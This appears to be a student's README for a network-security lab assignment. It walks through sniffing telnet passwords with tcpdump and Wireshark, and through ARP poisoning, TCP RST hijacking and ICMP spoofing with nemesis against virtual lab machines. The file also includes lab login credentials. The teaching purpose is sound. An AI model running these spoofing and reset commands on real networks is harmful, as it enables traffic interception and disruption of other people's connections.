## Assignment 2

  * [Setup](#setup)
    + [OpenVAS installation](#openvas-installation)
  * [1. Listening to the network](#1-listening-to-the-network)
    + [1.2 `tcpdump`](#12--tcpdump-)
    + [1.3 Wireshark](#13-wireshark)
    + [1.4 `nmap`](#14--nmap-)
  * [2. Vulnerabilities in TCP/IP](#2-vulnerabilities-in-tcp-ip)
    + [2.1 ARP redirect](#21-arp-redirect)
    + [2.2 RST Hijacking](#22-rst-hijacking)
    + [2.3 Redirect response to ICMP echo/request](#23-redirect-response-to-icmp-echo-request)
  * [3. OpenVAS](#3-openvas)
  * [4. References](#4-references)
  	+ [TCP header](#tcp-header)
  	+ [IP header](#ip-header)
  	+ [Ethernet header](#ethernet-header)

### Setup

#### OpenVAS installation

OpenVAS is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution.
Essentially it will be used to check for vulnerabilities in the configuration of machines in our virtual network.

```
cd ~/csc-course/assignment2 &&
sudo ./startVas &&
chmod +x openvas-check-setup &&
sudo ./openvas-check-setup --v9 # The --v9 flag is needed for version checking
```

Should the check fail, follow the instructions in FIX

### 1. Listening to the network

#### 1.2 `tcpdump`

Tcpdump prints the contents of network packets. With the necessary privileges on a system through which unencrypted traffic such as Telnet or HTTP passes, a user can use tcpdump to view login IDs, passwords, the URLs and content of websites being viewed, or any other unencrypted information. Here's a nice ghetto [documentation](https://www.wains.be/pub/networking/tcpdump_advanced_filters.txt).

Run `sudo tcpdump` on machine 3, and generate a ICMP packet from machine 1 to 2 using

```
ping -c 1 192.168.1.2 # The count option set to 1 generates a single packet
```

The output should resemble:
```
17:07:30.455566 IP machine1 > machine2: ICMP echo request, id 2701, seq 1, length 64
17:07:30.455664 IP machine2 > machine1: ICMP echo reply, id 2701, seq 1, length 64
```

The `-X` option prints each packet in HEX and ASCII minus its link level header. The `-XX` option prints each packet in HEX and ASCII including its link level header (refer to [ethernet header](#ethernet-header)). Inside the HEX dump output is the destination and source MAC addresses. 


On machine 3 run `sudo tcpdump -X dst host 192.168.1.1` and start a telnet connection from machine 2 to 1 
by writing `telnet 192.168.1.1` in machine 2.
The username ("user") and password ("inseguro") should appear letter by letter in separate packets. 
This previous tcpdump command captures any packets where the destination host is 192.168.1.1 and prints each in HEX and ASCII.

Notice however that this is not possible with an SSH session.

#### 1.3 Wireshark

On machine 3, start Wireshark
```
gksu wireshark # gksu is a library that provides a Gtk+ frontend to su and sudo
```
Start a capture on enps03 device.
Repeat the telnet connection from machine 1 to 2.
On wireshark follow the TCP stream of the telnet connection.
The output should have both the user and password in clear text.

Here you can check the [Ethernet](#ethernet-header), IP and TCP(#tcp-header) headers in ASCII that was in the HEX dump:

![](.images/wireshark_hexdump.png?raw=true)

However, if we establish an ssh connection between 1 and 2, Wireshark will detect the Diffie-Hellman key exchange,
but will be unable to decypher the content of the folowing ecnrypted packets.

#### 1.4 `nmap`

Nmap is a utility tht provides information on remote machines.
Issuing `nmap <IP>` should return a list of open ports on the destination machine.
`sudo nmap -O <IP>` should return the OS running on the destination machine. 

### 2. Vulnerabilities in TCP/IP

#### 2.1 ARP redirect

The arp table maps IP addresses to MAC addresses. Host machine uses ARP because when machine needs to send packet to another device, destination MAC address is needed to be written in the packet sent. 
Example: MachineA looks for MachineB's MAC address using the arp table, sends the packet to the switch. The switch matches the MAC adress in its MAC Addresses table and forwards the packet. If the MAC address was not found, the packet is broadcasted to all the ports.

**Machine 2 will be the attacker**. Start by obtaining the MAC addresses of 1 and 3.
```
ping -c 1 192.168.1.1 # 08:00:27:4b:d6:a2
ping -c 1 192.168.1.3 # 08:00:27:90:f9:41
```
Check the MAC address of the attacking machine with 
```
ifconfig # ... ether 08:00:27:94:55:1f
```

You can check the contents of the arp table with `arp -a #all`. Do it on machine 1 for example.
The command `arp` manipulates the system ARP cache, therefore the previous pings were to push the MAC addresses of those IPs to the cache.

Now, use `nemesis` in machine 2 to attack the arp table of machine 1.

```
sudo nemesis arp -v -S 192.168.1.3 -D 192.168.1.1 -h [MAC machine 2] -m [MAC machine 1]
```
-h Specifies the sender-hardware-address within the ARP frame only. 

-m Specifies the target-hardware-address within the ARP frame only. 

This should effectively fool machine 1 into thinking that machine3 has the MAC of 2, thus redirecting packets to it.
We can check the attack was succesful by checking the arp table in 1, which can resemble.
```
machine3 (192.168.1.3) at 08:00:27:94:55:1f [ether] on enp0s8
machine2 (192.168.1.2) at 08:00:27:94:55:1f [ether] on enp0s8
```
Notice how the MAC address is the same for both machines.

(Nemesis can natively craft and inject [ARP](http://nemesis.sourceforge.net/manpages/nemesis-arp.1.html), DNS, ETHERNET, ICMP, IGMP, IP, OSPF, RIP, [TCP](http://nemesis.sourceforge.net/manpages/nemesis-tcp.1.html) and UDP packets)

#### 2.2 RST Hijacking

The purpose of this attack is to reset a TCP connection.

**Machine 3 will be the attacker**. In machine 3 use tcpdump to find the ack number and port being used in the ssh connection.
```
tcpdump -S -n -e -l “tcp[13] & 16 == 16”
```

-S Prints absolute sequence numbers.

-n Displays IP addresses and port numbers instead of domain and service names when capturing packets.

-e Gets the ethernet header too.

-l Makes stdout line buffered. Useful if you want to see the data while capturing it.

“tcp[13] & 16 == 16” Gets the ACK and SYN number present in octet 13 (refer to [TCP header](#tcp-header)).

Set a ssh connection between machine 1 and 2. In machine 1:

```
ssh 192.168.1.2
```

Use machine 3 to send a reset packet to one of the machines.

```
nemesis tcp -v -fR -S 192.168.1.2 -x 22 -D 192.168.1.1 -y <port> -s <ack number>
```

where the `<port>` and the `<ack number>` are in the last line outputed in the tcpdump executed before. If you did the ssh connection from machine 2, switch the IPs of the machines.

-fR Specifies a RESET flag within the TCP header.

-x Specifies the source-port within the TCP header.

-y Specifies the destination-port within the TCP header.

-s Specifies the sequence-number within the TCP header.

The outcome of this should resemble:

```
packet_write_wait: Connection to 192.168.1.2 port 22: Broken pipe
```

#### 2.3 Redirect response to ICMP echo/request

This attack allows a ping response to be sent to a machine that didn’t make the
request.

In machine 3, use tcpdump to spy the source and destination in the packets.

```
tcpdump -n “ip[9]=1”
```

Refer to [IP Header](#ip-header)

In machine 3, send a ICMP packet with the wrong source.

```
nemesis icmp -S <source IP> -D <destination IP>
```

For instance, use source ```192.168.1.1``` and destination ```192.168.1.2```. Watch the tcpdump. Machine 2 replied to machine 1, but machine 1 never asked anything!


### 3. OpenVAS
Open the browser in `localhost` on the machine with openVAS (alternatively `192.168.1.[MACHINE]:443`).
Login in with
- user: `myuser`
- password: `44bb2d3f-d28f-4bcf-8f45-ae6ad2bc06b4`

1. Navigate to Scans > Tasks > Task Wizard and input the ip of the desired target.
2. Wait for like 30 mins :^)
3. Profit.


### 4. References

#### TCP Header

The structure of a TCP header without options:

```
 0                            15                              31
-----------------------------------------------------------------
|          source port          |       destination port        |
-----------------------------------------------------------------
|                        sequence number                        |
-----------------------------------------------------------------
|                     acknowledgment number                     |
-----------------------------------------------------------------
|  HL   | rsvd  |C|E|U|A|P|R|S|F|        window size            |
-----------------------------------------------------------------
|         TCP checksum          |       urgent pointer          |
-----------------------------------------------------------------
```

The octet 13 contains the TCP control bits where th ACK (A) number and SYN (S) number are present:

```
|C|E|U|A|P|R|S|F|
|---------------|
|0 0 0 1 0 0 0 0|
|---------------|
|7 6 5 4 3 2 1 0|
```

Since we only want to see ACK (which is bit 4 - in decimal 16), we will use the command:

```
tcpdump -S -n -e -l “tcp[13] & 16 == 16”
```

or


```
tcpdump -S -n -e -l “tcp[13] = 16”
```

That means "let the 13th octet of a TCP datagram have the decimal value 16".

The connection sequence with regard to the TCP control bits is

1) Caller sends SYN 

2) Recipient responds with SYN, ACK 

3) Caller sends ACK 

For more information check `man tcpdump` at "Capturing TCP packets with particular flag combinations (SYN-ACK, URG-ACK, etc.)".

#### IP Header

```
0                   1                   2                   3   
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    | <-- optional
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                            DATA ...                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

```
tcpdump “ip[9]=1”
```

Will get both the source and the destination address alike the TCP header.

(make this more complete...)

#### Ethernet Header

```
-------------------------------------------------------------------------------
| Preamble | Dest MAC address | Source MAC address | Type/Length | Data | FCS |
-------------------------------------------------------------------------------
```
